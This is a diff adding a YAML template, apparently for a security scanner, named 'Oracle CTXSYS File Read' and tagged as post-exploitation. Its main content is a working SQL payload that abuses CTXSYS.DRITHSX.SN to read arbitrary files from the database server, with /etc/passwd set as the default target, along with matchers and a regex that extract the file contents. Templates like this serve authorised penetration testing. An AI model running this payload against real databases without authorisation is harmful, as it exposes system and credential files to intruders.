@@ -1,0 +1,22 @@
+id: oracle-ctxsys-file-read
+service: [oracle]
+variables:
+  target_file: /etc/passwd
+info:
+  name: Oracle CTXSYS File Read
+  severity: high
+  tags: oracle,post-exploit,file-read
+
+services:
+  - ops:
+      - db: "SELECT 'content=' || CTXSYS.DRITHSX.SN(1, '{{target_file}}') FROM dual"
+        name: file_content
+    matchers:
+      - type: word
+        part: file_content
+        words: ["content="]
+    extractors:
+      - type: regex
+        name: oracle_file_content
+        part: file_content
+        regex: ['(?m)^content=(.+)$']
